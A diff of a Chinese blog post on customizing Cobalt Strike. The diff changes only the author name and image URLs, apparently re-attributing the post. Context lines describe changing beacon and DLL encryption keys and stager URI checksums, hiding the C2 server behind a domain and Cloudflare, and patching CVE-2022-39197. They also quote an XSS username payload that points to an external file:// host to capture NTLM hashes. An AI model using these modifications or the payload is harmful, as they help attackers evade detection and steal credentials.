@@ -2,7 +2,7 @@
 layout: post
 title: "CobaltStrike魔改"
 subtitle: '夫唯不争,故无尤.'
-author: "taomujian"
+author: "mangxieke"
 header-style: text
 tags:
   - CobaltStrike
@@ -34,31 +34,31 @@ java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.Conso
 
 > 打开IDEA选择Create New Project,一直选择Next,创建好后,把之前反编译得到的decompiled_src文件夹复制到项目中,之后再建立一个lib文件夹,把原始的CobaltStrike原始jar包放到这个目录中,最后项目结构如下图:
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/1.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/1.png)
 
 > 对这个项目进行设置,点击文件中的项目结构,点击模块,新建一个名为cobaltstrike的模块,JDK选择1.8(必须是这个版本),再对依赖进行设置.
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/2.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/2.png)
 
 > 依赖新添加一个,选择1 JAR或目录,选择之前建立的lib目录中的CobaltStrike原始jar包,点击确认
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/3.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/3.png)
 
 > 在工件中,新建一个工件,JAR->从具有依赖性的模块
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/4.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/4.png)
 
 > 这里需要填写一个Main Class,去lib中的META-INF里面双击MANIFEST.MF,复制aggressor.Aggressor,再次打开输入后点击确定就行.
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/5.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/5.png)
 
 > 接下来在decompiled_src中找到已经反编译完的aggressor主类,右键选择重构–复制文件,在到目录点击添加,选择之前创建的src文件夹,在其中新建一个aggressor,名字要一致,这样aggressor就自动的被拷贝到src目录里去了.
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/6.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/6.png)
 
 > 到这里基本的准备工作就完成了,之后需要修改哪个文件,就可以在完整的源码中找到那个文件,然后右键选择重构后然复制文件到这个目录进行修改,修改完成之后就可以选构建–>构建共建–>构建进行编译即可,最终编译后就会在out/artifacts/cobaltstrike_jar目录下生成一个名为cobaltstrike.jar文件.
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/7.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/7.png)
 
 ## 二开
 
@@ -70,9 +70,9 @@ java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.Conso
 
 > 修改beacon/BeaconPayload.java中的beacon_obfuscate函数里面的0x2E为一个任意的数字即可,除此之外还要修改一些dll文件(在sleeve文件夹中),这些dll文件使用这个密钥加密的,参考https://github.com/jas502n/cs_file_decrypt,需要注意的是对于4.4,还需要修改CrackSleeve.java内置的密钥.
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/8.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/8.png)
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/9.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/9.png)
 
 ```
 private static byte[] OriginKey = {94, -104, 25, 74, 1, -58, -76, -113, -91, -126, -90, -87, -4, -69, -110, -42};
@@ -92,17 +92,17 @@ java -cp cobaltstrike.jar:. CrackSleeve encode 5e98194a01c6b48fa582a6a9fcbb92d6
 
 > common/CommonUtils.java文件修改MSFURI和MSFURI_X64函数,这里可以任意修改,只要对应上就行,这里修改长度为6,检验和分别为78和79.
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/10.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/10.png)
 
 > cloudstrike/WebServer.java修改isStager和isStagerX64、isStagerStrict、isStagerX64Strict函数
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/11.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/11.png)
 
 ### 修复CVE-2022-39197漏洞
 
 > 攻击者通过设置假用户名(比如<html><img src='file://192.168.135.15/netntlm'%>),会触发XSS漏洞,进而在CS Server上造成远程代码执行.修复方法是在cloudstrike/WebServer.java里面的_serve函数中合适位置加上对uri开头字符的判断.
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/12.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/12.png)
 
 ```
 if (!uri.startsWith("/")) {
@@ -120,7 +120,7 @@ if (!uri.startsWith("/")) {
 
 > 在godaddy上购买一个域名,然后添加一个A记录,地址指向CobaltStrike服务所在机器IP
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/13.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/13.png)
 
 > 然后使用下面的指令生成证书,假设申请的域名为test.wiki
 
@@ -468,37 +468,37 @@ iptables -A INPUT -p tcp --dport 8443 -j DROP
 
 > 在这里输入我们之前购买的域名,点击继续,在页面里选择免费的方案即可,然后DNS的记录cloudflare都已获取到
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/14.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/14.png)
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/15.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/15.png)
 
 > 点击继续,就会提示需要在godaddy中把域名的名称服务器切换为cloudflare的域名服务器
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/16.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/16.png)
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/17.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/17.png)
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/18.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/18.png)
 
 > 切换完成后,点击继续就完成了,然后在下面选择检测nameserver,等待几小时(其实不到半小时就好了)cloudflare检测到更改完成就可以了.然后在缓存里打开开发者模式
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/19.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/19.png)
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/20.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/20.png)
 
 > 然后设置证书模式并生成cloudflare证书,使用默认配置创建即可.
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/21.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/21.png)
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/22.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/22.png)
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/23.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/23.png)
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/24.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/24.png)
 
 > 把生成的证书和私钥内容分别保存下来,然后就像上面自定义证书时用openssl和keytool生成CS的证书.
 
-![avatar](https://taomujian.github.io/img/CobaltStrike二开环境搭建与二开/25.png)
+![avatar](https://mangxieke.github.io/img/CobaltStrike二开环境搭建与二开/25.png)
 
 ```
 openssl pkcs12 -export -in fullchain.pem -inkey privkey.pem -out test.wiki.p12 -name test.wiki -passout pass:123456
